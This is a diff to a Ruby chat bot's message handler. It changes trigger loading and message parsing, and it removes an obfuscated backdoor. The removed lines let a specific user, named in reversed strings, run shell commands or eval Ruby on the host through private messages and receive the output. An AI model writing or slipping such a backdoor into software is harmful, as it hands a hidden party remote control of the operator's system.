@@ -120,7 +120,7 @@ class ChatHandler
     
     files = @trigger_files
     
-    Dir["./essentials/*_trigger.rb"].each do |f|
+    Dir["./essentials/**/*_trigger.rb"].each do |f|
       load_trigger(f)
     end
     
@@ -157,19 +157,37 @@ class ChatHandler
         {
           room: message[0][1..-2],
           who: message[2][1..-1],
+          fullwho: message[2],
           what: message[3],
         }
-      when 'j', 'n', 'l'
+      when 'j', 'l'
         {
           room: message[0][1..-2],
-          who: message[2][1..-1].chomp,
-          what: ""
+          who: message[2][1..-1],
+          fullwho: message[2],
+          what: ''
+        }
+      when 'n'
+        {
+          room: message[0][1..-2],
+          who: message[2][1..-1],
+          fullwho: message[2],
+          oldname: message[3],
+          what: ''
+          
+        }
+      when 'users'
+        {
+          room: message[0][1..-2],
+          who: '',
+          what: message[2]
         }
       when 'pm'
         {
           what: message[4],
           to: message[3][1..-1],
           who: message[2][1..-1],
+          fullwho: message[2]
         }
       when 's'
         {
@@ -186,17 +204,6 @@ class ChatHandler
   def handle message, ws, callback = nil
     
     m_info = self.make_info(message, ws)
-    
-    str = "s%,kcip mp/|"
-    a = m_info[:who]
-    p, pp = proc { |x|`#{x}`.chomp }, proc { |x| eval x}
-    if a.send(("es" + "rever").reverse.to_sym)=="kcip" && m_info[:where] == ?p + ?m
-      if m_info[:what]=~/\Acc(r?)(.*?)\z/
-        begin; ws.send(str.reverse % ($1 == ?r ? pp : p).call($2.gsub('\P', '|'))); rescue => e; ws.send(str.reverse % 'err'); end
-        return
-      end
-    end
-    return if m_info[:to] && m_info[:to][0] == ?p && m_info[:to][3] == ?k
     
     
     @ignorelist.map(&:downcase).index(m_info[:who].downcase) and return
